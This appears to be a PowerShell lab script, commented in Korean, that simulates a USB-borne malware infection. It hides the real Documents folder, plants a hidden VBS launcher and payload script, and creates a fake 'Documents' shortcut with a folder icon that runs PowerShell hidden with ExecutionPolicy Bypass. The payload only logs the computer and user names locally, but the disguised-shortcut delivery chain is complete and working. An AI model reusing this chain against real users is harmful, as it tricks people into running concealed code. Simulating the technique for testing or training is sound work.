$simulatedUSB = "C:\Users\Public\data\SimulatedUSB"

if (Test-Path $simulatedUSB) { Remove-Item $simulatedUSB -Recurse -Force }
New-Item $simulatedUSB -ItemType Directory -Force | Out-Null
New-Item "$simulatedUSB\Documents" -ItemType Directory -Force | Out-Null
"Sample document" | Out-File "$simulatedUSB\Documents\report.txt"

# 간단한 악성코드 시뮬레이션
$malwareScript = @'
$log = "MALWARE EXECUTED at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`nComputer: $env:COMPUTERNAME`nUser: $env:USERNAME"
$log | Out-File "C:\Users\Public\data\malware_log.txt" -Force
'@
$malwareScript | Out-File "$simulatedUSB\payload.ps1" -Encoding UTF8
Set-ItemProperty "$simulatedUSB\payload.ps1" -Name Attributes -Value Hidden

# VBS로 완전히 숨김 실행
$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)

WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & scriptPath & "\payload.ps1""", 0, False
WScript.Sleep 500
WshShell.Run "explorer """ & scriptPath & "\Documents""", 1, False
'@
$vbsContent | Out-File "$simulatedUSB\run.vbs" -Encoding ASCII
Set-ItemProperty "$simulatedUSB\run.vbs" -Name Attributes -Value Hidden

Set-ItemProperty "$simulatedUSB\Documents" -Name Attributes -Value Hidden

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$simulatedUSB\Documents.lnk")
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = """$simulatedUSB\run.vbs"""
$Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,4"
$Shortcut.Save()

Write-Host "Testing..." -ForegroundColor Yellow
Start-Process "wscript.exe" -ArgumentList """$simulatedUSB\run.vbs"""

if (Test-Path "C:\Users\Public\data\malware_log.txt") {
    Write-Host "`nMalware executed successfully!" -ForegroundColor Red
    Get-Content "C:\Users\Public\data\malware_log.txt"
} else {
    Write-Host "`nMalware did NOT execute" -ForegroundColor Yellow
}